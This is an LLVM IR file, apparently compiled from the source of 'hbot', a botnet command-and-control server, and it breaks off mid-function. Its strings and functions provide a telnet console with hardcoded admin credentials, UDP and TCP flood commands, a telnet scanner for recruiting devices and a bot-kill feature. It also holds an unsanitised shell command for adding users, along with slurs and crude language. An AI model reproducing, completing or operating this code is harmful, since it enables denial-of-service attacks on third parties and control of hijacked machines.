; ModuleID = 'llvm-link'
source_filename = "llvm-link"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.clientdata_t = type { i32, [7 x i8], [512 x i8], i8 }
%struct.telnetdata_t = type { i32, i32, [20 x i8] }
%struct.name = type { [512 x i8], i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.account = type { [200 x i8], [200 x i8], [200 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = dso_local global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = dso_local global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [8 x i8] c"\1B[1;31m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [45 x i8] c"\0D\0A\1B[1;31m%s\1B[1;36m@\1B[1;31mhbot\1B[1;36m#: \1B[0m\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.5 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"name:\00", align 1
@arra = internal global [40 x %struct.name] zeroinitializer, align 16
@.str.7 = private unnamed_addr constant [9 x i8] c".DSLKFJ\0A\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.9 = private unnamed_addr constant [8 x i8] c"LOCKED \00", align 1
@fileFD = internal global %struct._IO_FILE* null, align 8
@.str.10 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.11 = private unnamed_addr constant [11 x i8] c"killed pid\00", align 1
@BOATSRAPED = internal global i32 0, align 4
@.str.12 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.13 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.14 = private unnamed_addr constant [6 x i8] c"\22%s\22\0A\00", align 1
@.str.15 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.17 = private unnamed_addr constant [15 x i8] c"[%d.%d.%d.%d]\0A\00", align 1
@.str.18 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.20 = private unnamed_addr constant [2 x i8] c"\\\00", align 1
@.str.21 = private unnamed_addr constant [2 x i8] c"|\00", align 1
@.str.22 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@__const.titleWriter.spinbuf = private unnamed_addr constant [4 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.22, i32 0, i32 0)], align 16
@.str.23 = private unnamed_addr constant [35 x i8] c"%c]0;%d Devices Connected %s  %s%c\00", align 1
@managesConnected = internal global i32 0, align 4
@.str.24 = private unnamed_addr constant [6 x i8] c"admin\00", align 1
@.str.25 = private unnamed_addr constant [7 x i8] c"shadoh\00", align 1
@.str.26 = private unnamed_addr constant [6 x i8] c"!HBOT\00", align 1
@.str.27 = private unnamed_addr constant [9 x i8] c"%s %s %s\00", align 1
@accounts = internal global [25 x %struct.account] zeroinitializer, align 16
@.str.28 = private unnamed_addr constant [30 x i8] c"\1B[1;31mUsername\1B[1;36m:\1B[37m \00", align 1
@.str.29 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.30 = private unnamed_addr constant [15 x i8] c"connection.log\00", align 1
@.str.31 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.32 = private unnamed_addr constant [26 x i8] c"[LOGIN ATTEMPT] USER: %s\0A\00", align 1
@.str.33 = private unnamed_addr constant [30 x i8] c"\1B[1;31mPassword\1B[1;36m:\1B[37m \00", align 1
@.str.34 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.35 = private unnamed_addr constant [27 x i8] c"[FAILED ATTEMPT] USER: %s\0A\00", align 1
@.str.36 = private unnamed_addr constant [15 x i8] c"\1B[1A\1B[2J\1B[1;1H\00", align 1
@.str.37 = private unnamed_addr constant [43 x i8] c"\1B[1;31m%s\1B[1;36m@\1B[1;31mhbot\1B[1;36m#: \1B[0m\00", align 1
@.str.38 = private unnamed_addr constant [5 x i8] c"bots\00", align 1
@.str.39 = private unnamed_addr constant [6 x i8] c"count\00", align 1
@.str.40 = private unnamed_addr constant [9 x i8] c"botcount\00", align 1
@.str.41 = private unnamed_addr constant [30 x i8] c"\1B[37;1m%s\1B[31;1m: \1B[37;1m%d\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [33 x i8] c"\1B[37;1mtotal\1B[31;1m: \1B[37;1m%d\0D\0A\00", align 1
@.str.43 = private unnamed_addr constant [6 x i8] c"rape?\00", align 1
@.str.44 = private unnamed_addr constant [34 x i8] c"\1B[0mhbot.botkill: \1B[1;31m%d\1B[0m\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [8 x i8] c"resolve\00", align 1
@.str.46 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.47 = private unnamed_addr constant [28 x i8] c"\1B[0mresolved [%s] to [%s]\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.49 = private unnamed_addr constant [37 x i8] c"\1B[0mddoscmds - shows ddos commands\0D\0A\00", align 1
@.str.50 = private unnamed_addr constant [36 x i8] c"servercmds - server side commands\0D\0A\00", align 1
@.str.51 = private unnamed_addr constant [29 x i8] c"admincmds - admin commands\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [11 x i8] c"servercmds\00", align 1
@.str.53 = private unnamed_addr constant [29 x i8] c"\1B[0mbots - shows bot count\0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [29 x i8] c"exit - disconnect from net\0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [28 x i8] c"help - displays help menu\0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [10 x i8] c"admincmds\00", align 1
@.str.57 = private unnamed_addr constant [51 x i8] c"\1B[0mbtype - shows architecture of bots connected\0D\0A\00", align 1
@.str.58 = private unnamed_addr constant [46 x i8] c"users - displays who's connected to the net\0D\0A\00", align 1
@.str.59 = private unnamed_addr constant [66 x i8] c"addusr - add users via server side (IN DEVELOPMENT! VERY BUGGY)\0D\0A\00", align 1
@.str.60 = private unnamed_addr constant [32 x i8] c"start - starts telnet scanner\0D\0A\00", align 1
@.str.61 = private unnamed_addr constant [39 x i8] c"kickuser - logs user out must be admin\00", align 1
@.str.62 = private unnamed_addr constant [41 x i8] c"You Must Be Admin to Use This Command!\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [9 x i8] c"ddoscmds\00", align 1
@.str.64 = private unnamed_addr constant [28 x i8] c"\1B[0mUDP ip port time size\0D\0A\00", align 1
@.str.65 = private unnamed_addr constant [24 x i8] c"TCP ip port time size\0D\0A\00", align 1
@.str.66 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.67 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"\1B[0m\00", align 1
@.str.69 = private unnamed_addr constant [16 x i8] c"Attack Sent! \0D\0A\00", align 1
@.str.70 = private unnamed_addr constant [12 x i8] c"actions.log\00", align 1
@.str.71 = private unnamed_addr constant [31 x i8] c"[hbot] [%s] [Sent an Attack!]\0A\00", align 1
@.str.72 = private unnamed_addr constant [5 x i8] c". KT\00", align 1
@.str.73 = private unnamed_addr constant [32 x i8] c"[hbot] [%s] [Killed All Pid's]\0A\00", align 1
@.str.74 = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@.str.75 = private unnamed_addr constant [6 x i8] c"users\00", align 1
@.str.76 = private unnamed_addr constant [39 x i8] c"\1B[31m- \1B[31mOnline Users \1B[31m-\1B[37m\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [37 x i8] c"\1B[37mID(\1B[31m%d\1B[37m) \1B[31m%s\1B[37m\0D\0A\00", align 1
@.str.78 = private unnamed_addr constant [9 x i8] c"kickuser\00", align 1
@.str.79 = private unnamed_addr constant [6 x i8] c"user=\00", align 1
@.str.80 = private unnamed_addr constant [6 x i8] c"USER=\00", align 1
@.str.81 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@.str.82 = private unnamed_addr constant [43 x i8] c"\0A\1B[31mGoodbye, kicked by \1B[34m%s\1B[37m...\0D\0A\00", align 1
@.str.83 = private unnamed_addr constant [30 x i8] c"\1B[33mKicked \1B[34m%s\1B[37m...\0D\0A\00", align 1
@.str.84 = private unnamed_addr constant [4 x i8] c"id=\00", align 1
@.str.85 = private unnamed_addr constant [4 x i8] c"ID=\00", align 1
@.str.86 = private unnamed_addr constant [46 x i8] c"\1B[33mKicked user with id of \1B[34m%d\1B[37m...\0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [53 x i8] c"You Must Be big daddy shadoh to kick others, queer\0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [8 x i8] c"adduser\00", align 1
@.str.89 = private unnamed_addr constant [24 x i8] c"echo '\0A%s' >> login.txt\00", align 1
@.str.90 = private unnamed_addr constant [33 x i8] c"[hbot] [%s] [added a user] [%s]\0A\00", align 1
@.str.91 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@.str.92 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.93 = private unnamed_addr constant [9 x i8] c"chat.log\00", align 1
@.str.94 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.95 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.96 = private unnamed_addr constant [26 x i8] c"[hbot] [Admin Connected] \00", align 1
@.str.97 = private unnamed_addr constant [39 x i8] c"[hbot] [Admin Connected] [%d.%d.%d.%d]\00", align 1
@.str.98 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.99 = private unnamed_addr constant [46 x i8] c"[hbot] Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.100 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.101 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.102 = private unnamed_addr constant [11 x i8] c"killer.txt\00", align 1
@kfileFD = internal global %struct._IO_FILE* null, align 8
@.str.103 = private unnamed_addr constant [31 x i8] c"[hbot] Lower Threading Count.\0A\00", align 1
@.str.104 = private unnamed_addr constant [33 x i8] c"[hbot] Socket Opened On Port %d\0A\00", align 1
@.str.105 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.106 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.107 = private unnamed_addr constant [5 x i8] c"hbot\00", align 1
@.str.108 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.109 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.110 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.111 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @fdgets(i8* noundef %0, i32 noundef %1, i32 noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 noundef %28, i8* noundef %32, i64 noundef 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9, !llvm.loop !6

37:                                               ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32 noundef, i8* noundef, i64 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @trim(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* noundef %6) #9
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %25, %1
  %11 = call i16** @__ctype_b_loc() #10
  %12 = load i16*, i16** %11, align 8
  %13 = load i8*, i8** %2, align 8
  %14 = load i32, i32* %4, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = sext i8 %17 to i32
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i16, i16* %12, i64 %19
  %21 = load i16, i16* %20, align 2
  %22 = zext i16 %21 to i32
  %23 = and i32 %22, 8192
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %28

25:                                               ; preds = %10
  %26 = load i32, i32* %4, align 4
  %27 = add nsw i32 %26, 1
  store i32 %27, i32* %4, align 4
  br label %10, !llvm.loop !8

28:                                               ; preds = %10
  br label %29

29:                                               ; preds = %50, %28
  %30 = load i32, i32* %5, align 4
  %31 = load i32, i32* %4, align 4
  %32 = icmp sge i32 %30, %31
  br i1 %32, label %33, label %48

33:                                               ; preds = %29
  %34 = call i16** @__ctype_b_loc() #10
  %35 = load i16*, i16** %34, align 8
  %36 = load i8*, i8** %2, align 8
  %37 = load i32, i32* %5, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds i8, i8* %36, i64 %38
  %40 = load i8, i8* %39, align 1
  %41 = sext i8 %40 to i32
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i16, i16* %35, i64 %42
  %44 = load i16, i16* %43, align 2
  %45 = zext i16 %44 to i32
  %46 = and i32 %45, 8192
  %47 = icmp ne i32 %46, 0
  br label %48

48:                                               ; preds = %33, %29
  %49 = phi i1 [ false, %29 ], [ %47, %33 ]
  br i1 %49, label %50, label %53

50:                                               ; preds = %48
  %51 = load i32, i32* %5, align 4
  %52 = add nsw i32 %51, -1
  store i32 %52, i32* %5, align 4
  br label %29, !llvm.loop !9

53:                                               ; preds = %48
  %54 = load i32, i32* %4, align 4
  store i32 %54, i32* %3, align 4
  br label %55

55:                                               ; preds = %71, %53
  %56 = load i32, i32* %3, align 4
  %57 = load i32, i32* %5, align 4
  %58 = icmp sle i32 %56, %57
  br i1 %58, label %59, label %74

59:                                               ; preds = %55
  %60 = load i8*, i8** %2, align 8
  %61 = load i32, i32* %3, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = load i8*, i8** %2, align 8
  %66 = load i32, i32* %3, align 4
  %67 = load i32, i32* %4, align 4
  %68 = sub nsw i32 %66, %67
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %65, i64 %69
  store i8 %64, i8* %70, align 1
  br label %71

71:                                               ; preds = %59
  %72 = load i32, i32* %3, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %3, align 4
  br label %55, !llvm.loop !10

74:                                               ; preds = %55
  %75 = load i8*, i8** %2, align 8
  %76 = load i32, i32* %3, align 4
  %77 = load i32, i32* %4, align 4
  %78 = sub nsw i32 %76, %77
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %75, i64 %79
  store i8 0, i8* %80, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8* noundef) #2

; Function Attrs: nounwind readnone willreturn
declare i16** @__ctype_b_loc() #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @broadcast(i8* noundef %0, i32 noundef %1, i8* noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca [56 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  %11 = alloca %struct.tm*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %14 = load i8*, i8** %4, align 8
  %15 = call i32 @strcmp(i8* noundef %14, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #9
  %16 = icmp eq i32 %15, 0
  br i1 %16, label %17, label %18

17:                                               ; preds = %3
  store i32 0, i32* %7, align 4
  br label %18

18:                                               ; preds = %17, %3
  %19 = load i8*, i8** %4, align 8
  %20 = call i64 @strlen(i8* noundef %19) #9
  %21 = add i64 %20, 10
  %22 = call noalias i8* @malloc(i64 noundef %21) #11
  store i8* %22, i8** %9, align 8
  %23 = load i8*, i8** %9, align 8
  %24 = load i8*, i8** %4, align 8
  %25 = call i64 @strlen(i8* noundef %24) #9
  %26 = add i64 %25, 10
  call void @llvm.memset.p0i8.i64(i8* align 1 %23, i8 0, i64 %26, i1 false)
  %27 = load i8*, i8** %9, align 8
  %28 = load i8*, i8** %4, align 8
  %29 = call i8* @strcpy(i8* noundef %27, i8* noundef %28) #11
  %30 = load i8*, i8** %9, align 8
  call void @trim(i8* noundef %30)
  %31 = call i64 @time(i64* noundef %10) #11
  %32 = call %struct.tm* @localtime(i64* noundef %10) #11
  store %struct.tm* %32, %struct.tm** %11, align 8
  %33 = load %struct.tm*, %struct.tm** %11, align 8
  %34 = call i8* @asctime(%struct.tm* noundef %33) #11
  store i8* %34, i8** %12, align 8
  %35 = load i8*, i8** %12, align 8
  call void @trim(i8* noundef %35)
  store i32 0, i32* %13, align 4
  br label %36

36:                                               ; preds = %113, %18
  %37 = load i32, i32* %13, align 4
  %38 = icmp slt i32 %37, 1000000
  br i1 %38, label %39, label %116

39:                                               ; preds = %36
  %40 = load i32, i32* %13, align 4
  %41 = load i32, i32* %5, align 4
  %42 = icmp eq i32 %40, %41
  br i1 %42, label %60, label %43

43:                                               ; preds = %39
  %44 = load i32, i32* %13, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %45
  %47 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %46, i32 0, i32 3
  %48 = load i8, i8* %47, align 1
  %49 = icmp ne i8 %48, 0
  br i1 %49, label %61, label %50

50:                                               ; preds = %43
  %51 = load i32, i32* %7, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %60, label %53

53:                                               ; preds = %50
  %54 = load i32, i32* %13, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %55
  %57 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %56, i32 0, i32 1
  %58 = load i32, i32* %57, align 4
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %61, label %60

60:                                               ; preds = %53, %50, %39
  br label %113

61:                                               ; preds = %53, %43
  %62 = load i32, i32* %7, align 4
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %64, label %81

64:                                               ; preds = %61
  %65 = load i32, i32* %13, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %66
  %68 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %67, i32 0, i32 1
  %69 = load i32, i32* %68, align 4
  %70 = icmp ne i32 %69, 0
  br i1 %70, label %71, label %81

71:                                               ; preds = %64
  %72 = load i32, i32* %13, align 4
  %73 = call i64 @send(i32 noundef %72, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i64 noundef 7, i32 noundef 16384)
  %74 = load i32, i32* %13, align 4
  %75 = load i8*, i8** %6, align 8
  %76 = load i8*, i8** %6, align 8
  %77 = call i64 @strlen(i8* noundef %76) #9
  %78 = call i64 @send(i32 noundef %74, i8* noundef %75, i64 noundef %77, i32 noundef 16384)
  %79 = load i32, i32* %13, align 4
  %80 = call i64 @send(i32 noundef %79, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  br label %81

81:                                               ; preds = %71, %64, %61
  %82 = load i32, i32* %13, align 4
  %83 = load i8*, i8** %4, align 8
  %84 = load i8*, i8** %4, align 8
  %85 = call i64 @strlen(i8* noundef %84) #9
  %86 = call i64 @send(i32 noundef %82, i8* noundef %83, i64 noundef %85, i32 noundef 16384)
  %87 = getelementptr inbounds [56 x i8], [56 x i8]* %8, i64 0, i64 0
  %88 = load i32, i32* %13, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %89
  %91 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %90, i32 0, i32 2
  %92 = getelementptr inbounds [20 x i8], [20 x i8]* %91, i64 0, i64 0
  %93 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %87, i8* noundef getelementptr inbounds ([45 x i8], [45 x i8]* @.str.3, i64 0, i64 0), i8* noundef %92) #11
  %94 = load i32, i32* %7, align 4
  %95 = icmp ne i32 %94, 0
  br i1 %95, label %96, label %109

96:                                               ; preds = %81
  %97 = load i32, i32* %13, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %98
  %100 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %99, i32 0, i32 1
  %101 = load i32, i32* %100, align 4
  %102 = icmp ne i32 %101, 0
  br i1 %102, label %103, label %109

103:                                              ; preds = %96
  %104 = load i32, i32* %13, align 4
  %105 = getelementptr inbounds [56 x i8], [56 x i8]* %8, i64 0, i64 0
  %106 = getelementptr inbounds [56 x i8], [56 x i8]* %8, i64 0, i64 0
  %107 = call i64 @strlen(i8* noundef %106) #9
  %108 = call i64 @send(i32 noundef %104, i8* noundef %105, i64 noundef %107, i32 noundef 16384)
  br label %112

109:                                              ; preds = %96, %81
  %110 = load i32, i32* %13, align 4
  %111 = call i64 @send(i32 noundef %110, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0), i64 noundef 1, i32 noundef 16384)
  br label %112

112:                                              ; preds = %109, %103
  br label %113

113:                                              ; preds = %112, %60
  %114 = load i32, i32* %13, align 4
  %115 = add nsw i32 %114, 1
  store i32 %115, i32* %13, align 4
  br label %36, !llvm.loop !11

116:                                              ; preds = %36
  %117 = load i8*, i8** %9, align 8
  call void @free(i8* noundef %117) #11
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8* noundef, i8* noundef) #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64 noundef) #4

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #5

; Function Attrs: nounwind
declare i8* @strcpy(i8* noundef, i8* noundef) #4

; Function Attrs: nounwind
declare i64 @time(i64* noundef) #4

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64* noundef) #4

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm* noundef) #4

declare i64 @send(i32 noundef, i8* noundef, i64 noundef, i32 noundef) #1

; Function Attrs: nounwind
declare i32 @sprintf(i8* noundef, i8* noundef, ...) #4

; Function Attrs: nounwind
declare void @free(i8* noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @removestr(i8* noundef %0, i8* noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %5 = load i8*, i8** %3, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = call i8* @strstr(i8* noundef %5, i8* noundef %6) #9
  store i8* %7, i8** %3, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = load i8*, i8** %3, align 8
  %10 = load i8*, i8** %4, align 8
  %11 = call i64 @strlen(i8* noundef %10) #9
  %12 = getelementptr inbounds i8, i8* %9, i64 %11
  %13 = load i8*, i8** %3, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* noundef %14) #9
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = call i64 @strlen(i8* noundef %16) #9
  %18 = add i64 1, %17
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 1 %8, i8* align 1 %12, i64 %18, i1 false)
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8* noundef, i8* noundef) #2

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i1 immarg) #6

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @epollEventLoop(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.epoll_event, align 1
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr, align 2
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca [200 x i8], align 16
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.clientdata_t*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i64, align 8
  %19 = alloca [2048 x i8], align 16
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %22 = call noalias i8* @calloc(i64 noundef 1000000, i64 noundef 12) #11
  %23 = bitcast i8* %22 to %struct.epoll_event*
  store %struct.epoll_event* %23, %struct.epoll_event** %4, align 8
  br label %24

24:                                               ; preds = %343, %1
  %25 = load volatile i32, i32* @epollFD, align 4
  %26 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %27 = call i32 @epoll_wait(i32 noundef %25, %struct.epoll_event* noundef %26, i32 noundef 1000000, i32 noundef -1)
  store i32 %27, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %28

28:                                               ; preds = %340, %24
  %29 = load i32, i32* %7, align 4
  %30 = load i32, i32* %6, align 4
  %31 = icmp slt i32 %29, %30
  br i1 %31, label %32, label %343

32:                                               ; preds = %28
  %33 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %34 = load i32, i32* %7, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %33, i64 %35
  %37 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %36, i32 0, i32 0
  %38 = load i32, i32* %37, align 1
  %39 = and i32 %38, 8
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %59, label %41

41:                                               ; preds = %32
  %42 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %43 = load i32, i32* %7, align 4
